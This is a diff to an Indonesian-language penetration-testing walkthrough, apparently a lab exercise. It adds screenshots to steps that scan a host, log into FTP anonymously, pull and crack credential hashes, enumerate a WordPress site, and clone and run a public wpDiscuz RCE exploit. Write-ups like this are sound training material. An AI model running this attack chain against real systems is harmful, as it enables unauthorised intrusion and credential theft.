@@ -29,18 +29,24 @@ Pindai server untuk menemukan port yang terbuka:
 ```bash
 nmap -p- 10.15.42.245
 ```
+![langkah 1](https://github.com/user-attachments/assets/c1c2c175-0904-42e9-ad4e-10f43bda4e87)
+
 
 Pindai kerentanan FTP dengan Nmap:
 
 ```bash
 nmap --script=ftp-anon,ftp-vsftpd-backdoor -p21 10.15.42.245
 ```
+![langkah 2](https://github.com/user-attachments/assets/e1622ada-0dc9-4a72-b402-35f5904e8fd5)
+
 
 Login ke FTP menggunakan akun anonymous:
 
 ```bash
 ftp 10.15.42.245
 ```
+![langkah 3](https://github.com/user-attachments/assets/ddb6a8dd-5e9e-4240-966f-124bf9380e0a)
+
 
 Download file yang ditemukan:
 
@@ -49,6 +55,8 @@ ls
 get list.xyz
 get readme.txt
 ```
+![langkah 4](https://github.com/user-attachments/assets/af24be7f-4219-40a3-8dd3-0d9b06e7c6e8)
+
 
 Mencari username atau password dalam file:
 
@@ -56,6 +64,8 @@ Mencari username atau password dalam file:
 cat list.xyz
 grep -i "ethack" list.xyz
 ```
+![langkah 5](https://github.com/user-attachments/assets/70d6be57-2b69-45ee-a9f4-4fbfed67d89c)
+
 
 Simpan hash dan crack dengan John the Ripper:
 
@@ -72,15 +82,20 @@ gobuster dir --url http://10.15.42.245:487 --wordlist /usr/share/wordlists/dirb/
 
 Gunakan wpscan untuk mendeteksi plugin WordPress yang terinstal:
 
+![langkah 6](https://github.com/user-attachments/assets/4b46ba37-e4cb-4191-a71a-ef75216d3920)
+
+
 ```bash
 wpscan --url http://10.15.42.245:487 --enumerate p
 ```
+![langkah 7](https://github.com/user-attachments/assets/86286eda-8900-48d6-8cf4-5b5a101df2f5)
 
 Clone exploit wpDiscuz:
 
 ```bash
 git clone https://github.com/hev0x/CVE-2020-24186-wpDiscuz-7.0.4-RCE
 ```
+![langkah 8](https://github.com/user-attachments/assets/ce1f2b97-1a83-4b2e-a69e-c977bfb87140)
 
 Jalankan exploit:
 
@@ -93,6 +108,8 @@ Tampilkan:
 ```bash
 ls
 ```
+![langkah 9](https://github.com/user-attachments/assets/42e42452-3951-4645-b4fe-8b848ad104e1)
+
 
 6. Dampak
 
